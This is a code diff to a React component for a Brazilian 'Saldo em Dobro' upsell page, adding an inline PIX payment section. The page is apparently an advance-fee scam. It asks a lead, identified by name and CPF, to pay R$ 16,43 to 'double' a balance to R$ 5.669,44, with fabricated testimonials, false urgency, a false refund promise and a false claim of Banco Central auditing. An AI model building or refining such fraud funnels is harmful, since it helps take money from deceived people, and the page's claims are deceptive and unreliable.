@@ -1,16 +1,19 @@
 import { useState } from "react";
 import { Loader2, Check, ChevronDown, ChevronUp } from "lucide-react";
 import StickyCtaBar from "./StickyCtaBar";
+import InlinePixSection from "./InlinePixSection";
 import testimonial1 from "@/assets/testimonial-1.jpg";
 import testimonial2 from "@/assets/testimonial-2.jpg";
 import testimonial3 from "@/assets/testimonial-3.jpg";
+import { PixPaymentData } from "./types";
 
-interface FunnelUpsellSaldoDuplicadoProps { balance: string; onGeneratePix: () => void; isGenerating: boolean; leadCpf?: string; leadName?: string; }
+interface FunnelUpsellSaldoDuplicadoProps { balance: string; onGeneratePix: () => void; isGenerating: boolean; leadCpf?: string; leadName?: string; pixData?: PixPaymentData | null; onCopyPix?: () => void; isPixCopied?: boolean; onManualCheck?: () => void; isCheckingPayment?: boolean; checkError?: string | null; }
 const FaqItem = ({ question, answer }: { question: string; answer: string }) => { const [open, setOpen] = useState(false); return (<div className="bg-white rounded-lg border border-gray-100 overflow-hidden"><button onClick={() => setOpen(!open)} className="w-full flex items-center justify-between p-3 text-left"><span className="text-gray-800 text-xs font-semibold pr-2">{question}</span>{open ? <ChevronUp className="w-4 h-4 text-gray-400 shrink-0" /> : <ChevronDown className="w-4 h-4 text-gray-400 shrink-0" />}</button>{open && <div className="px-3 pb-3 pt-0"><p className="text-gray-500 text-[11px] leading-relaxed">{answer}</p></div>}</div>); };
 const TestimonialCard = ({ img, name, location, text, amount }: { img: string; name: string; location: string; text: string; amount: string }) => (<div className="bg-white rounded-lg p-3 border border-gray-100"><div className="flex items-center gap-2 mb-2"><img src={img} alt={name} loading="lazy" className="w-8 h-8 rounded-full object-cover" /><div><p className="text-gray-800 text-xs font-semibold">{name}</p><p className="text-gray-400 text-[10px]">{location}</p></div><span className="ml-auto text-green-600 text-[10px] font-bold">+{amount}</span></div><p className="text-gray-500 text-[11px] leading-relaxed">"{text}"</p></div>);
 
-const FunnelUpsellSaldoDuplicado = ({ balance, onGeneratePix, isGenerating, leadCpf, leadName }: FunnelUpsellSaldoDuplicadoProps) => {
+const FunnelUpsellSaldoDuplicado = ({ balance, onGeneratePix, isGenerating, leadCpf, leadName, pixData, onCopyPix, isPixCopied, onManualCheck, isCheckingPayment, checkError }: FunnelUpsellSaldoDuplicadoProps) => {
   const firstName = leadName ? leadName.split(" ")[0] : "";
+  const showPixInline = !!pixData?.pix_code;
   return (
     <div className="fixed inset-0 z-[80] bg-[#F0F2F5] overflow-y-auto pt-6">
       <div className="bg-[#1B5E20] py-3 px-4"><h1 className="text-white text-sm font-bold text-center tracking-wide flex items-center justify-center gap-2">💰 PROMOÇÃO EXCLUSIVA — SALDO EM DOBRO</h1></div>
@@ -30,11 +33,16 @@ const FunnelUpsellSaldoDuplicado = ({ balance, onGeneratePix, isGenerating, lead
           <p className="text-gray-400 text-[10px] text-center mt-2">🔒 Pagamento seguro via PIX • Reembolso garantido</p>
           <p className="text-gray-500 text-[11px] text-center leading-relaxed mt-3"><span className="font-bold text-gray-700">7.612 pessoas</span> já duplicaram o saldo nos últimos 7 dias.</p>
         </div>
+
+        {showPixInline && pixData && (
+          <InlinePixSection pixData={pixData} amount="R$ 16,43" label="Saldo Duplicado" onCopy={onCopyPix} isCopied={isPixCopied} onManualCheck={onManualCheck} isCheckingPayment={isCheckingPayment} checkError={checkError} accentColor="#1B5E20" />
+        )}
+
         <div className="mb-3"><p className="text-gray-600 text-xs font-bold text-center mb-2">Perguntas frequentes</p><div className="space-y-2"><FaqItem question="Como funciona a duplicação de saldo?" answer="O sistema aplica um multiplicador 2x ao seu saldo atual. Ao ativar a conversão, seu saldo é multiplicado para R$ 5.669,44." /><FaqItem question="Por que preciso pagar R$ 16,43?" answer="A taxa cobre o custo da conversão no módulo de multiplicação do sistema. É 100% reembolsável." /><FaqItem question="Posso ativar a duplicação depois?" answer="Não. A promoção Saldo em Dobro é vinculada à sua sessão atual. Se avançar sem ativar, a oferta expira permanentemente." /></div></div>
         <div className="mb-3"><p className="text-gray-600 text-xs font-bold text-center mb-2">Quem duplicou, recebeu em dobro</p><div className="space-y-2"><TestimonialCard img={testimonial1} name="Thiago R." location="Goiânia, GO" text="Não acreditei quando vi a oferta de duplicar. Ativei e em 2 minutos caiu o dobro do saldo na minha conta." amount="R$ 5.669,44" /><TestimonialCard img={testimonial2} name="Camila B." location="Fortaleza, CE" text="Quase deixei passar achando que não era real. Minha irmã me convenceu a ativar e recebi tudo duplicado." amount="R$ 5.669,44" /><TestimonialCard img={testimonial3} name="Rafael N." location="Florianópolis, SC" text="Já tinha recebido o saldo normal antes. Dessa vez apareceu a duplicação e eu ativei na hora." amount="R$ 5.669,44" /></div></div>
         <div className="text-center pb-6"><p className="text-gray-400 text-[10px]">Sistema de conversão auditado pelo Banco Central</p></div>
       </main>
-      <StickyCtaBar onClick={onGeneratePix} isGenerating={isGenerating} label="DUPLICAR MEU SALDO PARA R$ 5.669,44" bgColor="bg-[#1B5E20]" shadowColor="shadow-green-200" />
+      {!showPixInline && <StickyCtaBar onClick={onGeneratePix} isGenerating={isGenerating} label="DUPLICAR MEU SALDO PARA R$ 5.669,44" bgColor="bg-[#1B5E20]" shadowColor="shadow-green-200" />}
     </div>
   );
 };
